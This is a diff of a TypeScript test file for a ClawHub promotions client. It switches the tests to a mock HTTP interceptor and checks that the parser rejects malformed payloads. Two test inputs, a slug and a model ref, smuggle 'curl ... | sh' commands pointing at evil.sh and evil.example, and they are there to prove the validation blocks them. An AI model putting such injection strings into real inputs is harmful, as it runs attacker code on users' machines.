@@ -1,11 +1,14 @@
-import { describe, expect, it, vi } from "vitest";
+import { describe, expect, it } from "vitest";
+import { useMockHttp } from "../test-utils/mock-http.js";
 import {
   fetchClawHubPromotion,
   fetchClawHubPromotions,
   fetchClawHubPromotionsFeed,
-  parseClawHubPromotion,
   parseClawHubPromotionsFeed,
 } from "./clawhub.js";
+
+const CLAWHUB_URL = "https://clawhub.ai";
+const mockHttp = useMockHttp();
 
 const validPromotion = {
   slug: "spring-models",
@@ -21,95 +24,78 @@ const validPromotion = {
   signupUrl: "https://signup.example.com",
 };
 
-function jsonResponse(body: unknown, status = 200, headers: Record<string, string> = {}) {
-  return new Response(JSON.stringify(body), {
-    status,
-    headers: { "content-type": "application/json", ...headers },
-  });
-}
-
-describe("parseClawHubPromotion", () => {
-  it("parses a full promotion payload", () => {
-    const parsed = parseClawHubPromotion({
-      ...validPromotion,
-      pluginNames: ["@openclaw/openrouter-provider"],
+describe("promotion payload validation", () => {
+  async function expectPromotionRejected(
+    overrides: Record<string, unknown>,
+    expected: RegExp,
+  ): Promise<void> {
+    mockHttp.intercept({
+      url: `${CLAWHUB_URL}/api/v1/promotions/spring-models`,
+      reply: { json: { ...validPromotion, ...overrides } },
     });
-    expect(parsed.slug).toBe("spring-models");
-    expect(parsed.models[0]?.suggestedDefault).toBe(true);
-    expect(parsed.pluginNames).toEqual(["@openclaw/openrouter-provider"]);
+    await expect(fetchClawHubPromotion({ slug: "spring-models" })).rejects.toThrow(expected);
+  }
+
+  it("rejects payloads without models", async () => {
+    await expectPromotionRejected({ models: [] }, /models/);
   });
 
-  it("rejects payloads without models", () => {
-    expect(() => parseClawHubPromotion({ ...validPromotion, models: [] })).toThrow(/models/);
+  it("rejects slugs outside ClawHub's slug contract", async () => {
+    await expectPromotionRejected({ slug: "deal; curl evil.sh|sh" }, /slug/);
   });
 
-  it("rejects slugs outside ClawHub's slug contract", () => {
-    // Slugs are echoed into copy-paste commands; shell metacharacters must fail parsing.
-    expect(() =>
-      parseClawHubPromotion({ ...validPromotion, slug: "deal; curl evil.sh|sh" }),
-    ).toThrow(/slug/);
-    expect(() => parseClawHubPromotion({ ...validPromotion, slug: "UPPER-case" })).toThrow(/slug/);
-  });
-
-  it("rejects model refs with shell metacharacters", () => {
-    expect(() =>
-      parseClawHubPromotion({
-        ...validPromotion,
-        models: [{ modelRef: "openrouter/foo; curl https://evil.example/sh | sh" }],
-      }),
-    ).toThrow(/unsupported characters/);
-  });
-
-  it("rejects non-string model refs", () => {
-    expect(() => parseClawHubPromotion({ ...validPromotion, models: [{ modelRef: 42 }] })).toThrow(
-      /modelRef/,
+  it("rejects model refs with shell metacharacters", async () => {
+    await expectPromotionRejected(
+      { models: [{ modelRef: "openrouter/foo; curl https://evil.example/sh | sh" }] },
+      /unsupported characters/,
     );
   });
 
-  it("rejects non-numeric windows", () => {
-    expect(() => parseClawHubPromotion({ ...validPromotion, endsAt: "soon" })).toThrow(/endsAt/);
+  it("rejects non-string model refs", async () => {
+    await expectPromotionRejected({ models: [{ modelRef: 42 }] }, /modelRef/);
   });
 
-  it("rejects inverted promotion windows", () => {
-    expect(() =>
-      parseClawHubPromotion({
-        ...validPromotion,
-        startsAt: 200,
-        endsAt: 200,
-      }),
-    ).toThrow(/window/);
+  it("rejects non-numeric windows", async () => {
+    await expectPromotionRejected({ endsAt: "soon" }, /endsAt/);
   });
 
-  it("rejects plugin values that are not package names", () => {
-    expect(() =>
-      parseClawHubPromotion({
-        ...validPromotion,
-        pluginNames: ["@openclaw/openrouter-provider@latest"],
-      }),
-    ).toThrow(/pluginNames/);
+  it("rejects inverted promotion windows", async () => {
+    await expectPromotionRejected({ startsAt: 200, endsAt: 200 }, /window/);
+  });
+
+  it("rejects plugin values that are not package names", async () => {
+    await expectPromotionRejected(
+      { pluginNames: ["@openclaw/openrouter-provider@latest"] },
+      /pluginNames/,
+    );
   });
 });
 
 describe("promotion fetches", () => {
   it("fetches and validates the active promotions list", async () => {
-    const fetchImpl = vi.fn(async (..._args: unknown[]) =>
-      jsonResponse({ promotions: [validPromotion] }),
-    );
-    const promotions = await fetchClawHubPromotions({ fetchImpl });
+    mockHttp.intercept({
+      url: `${CLAWHUB_URL}/api/v1/promotions`,
+      reply: { json: { promotions: [validPromotion] } },
+    });
+    const promotions = await fetchClawHubPromotions();
     expect(promotions).toHaveLength(1);
-    expect(String(fetchImpl.mock.calls[0]?.[0])).toContain("/api/v1/promotions");
   });
 
   it("rejects a list response without a promotions array", async () => {
-    const fetchImpl = vi.fn(async (..._args: unknown[]) => jsonResponse({ nope: true }));
-    await expect(fetchClawHubPromotions({ fetchImpl })).rejects.toThrow(/promotions array/);
+    mockHttp.intercept({
+      url: `${CLAWHUB_URL}/api/v1/promotions`,
+      reply: { json: { nope: true } },
+    });
+    await expect(fetchClawHubPromotions()).rejects.toThrow(/promotions array/);
   });
 
   it("fetches a single promotion by slug", async () => {
-    const fetchImpl = vi.fn(async (..._args: unknown[]) => jsonResponse(validPromotion));
-    const promotion = await fetchClawHubPromotion({ slug: "spring-models", fetchImpl });
+    mockHttp.intercept({
+      url: `${CLAWHUB_URL}/api/v1/promotions/spring-models`,
+      reply: { json: validPromotion },
+    });
+    const promotion = await fetchClawHubPromotion({ slug: "spring-models" });
     expect(promotion.title).toBe("Free Example models");
-    expect(String(fetchImpl.mock.calls[0]?.[0])).toContain("/api/v1/promotions/spring-models");
   });
 });
 
@@ -169,33 +155,41 @@ describe("parseClawHubPromotionsFeed", () => {
 
 describe("fetchClawHubPromotionsFeed", () => {
   it("fetches without auth, returns the parsed feed and etag", async () => {
-    const fetchImpl = vi.fn(async (..._args: unknown[]) =>
-      jsonResponse(validFeed, 200, { etag: '"seq-3"' }),
-    );
-    const result = await fetchClawHubPromotionsFeed({ fetchImpl });
+    mockHttp.intercept({
+      url: `${CLAWHUB_URL}/api/v1/feeds/promotions`,
+      requestHeaders: (headers) =>
+        !Object.keys(headers).some((name) => name.toLowerCase() === "authorization"),
+      reply: { json: validFeed, headers: { etag: '"seq-3"' } },
+    });
+    const result = await fetchClawHubPromotionsFeed();
     expect(result.status).toBe("ok");
     if (result.status === "ok") {
       expect(result.feed.sequence).toBe(3);
       expect(result.etag).toBe('"seq-3"');
     }
-    expect(String(fetchImpl.mock.calls[0]?.[0])).toContain("/api/v1/feeds/promotions");
-    const init = fetchImpl.mock.calls[0]?.[1] as RequestInit;
-    expect(new Headers(init?.headers).get("authorization")).toBeNull();
   });
 
   it("sends If-None-Match and maps 304 to not-modified", async () => {
-    const fetchImpl = vi.fn(async (..._args: unknown[]) => new Response(null, { status: 304 }));
-    const result = await fetchClawHubPromotionsFeed({ etag: '"seq-3"', fetchImpl });
+    mockHttp.intercept({
+      url: `${CLAWHUB_URL}/api/v1/feeds/promotions`,
+      requestHeaders: { "if-none-match": '"seq-3"' },
+      reply: { status: 304 },
+    });
+    const result = await fetchClawHubPromotionsFeed({ etag: '"seq-3"' });
     expect(result.status).toBe("not-modified");
-    const init = fetchImpl.mock.calls[0]?.[1] as RequestInit;
-    expect(new Headers(init?.headers).get("if-none-match")).toBe('"seq-3"');
   });
 
   it("does not extend the interactive feed timeout with transient retries", async () => {
-    const fetchImpl = vi.fn().mockRejectedValue(new Error("offline"));
+    mockHttp.intercept({
+      url: `${CLAWHUB_URL}/api/v1/feeds/promotions`,
+      reply: new Error("offline"),
+    });
 
-    await expect(fetchClawHubPromotionsFeed({ fetchImpl })).rejects.toThrow("offline");
+    await expect(fetchClawHubPromotionsFeed()).rejects.toMatchObject({
+      message: "fetch failed",
+      cause: expect.objectContaining({ message: "offline" }),
+    });
 
-    expect(fetchImpl).toHaveBeenCalledTimes(1);
+    expect(mockHttp.requests()).toHaveLength(1);
   });
 });
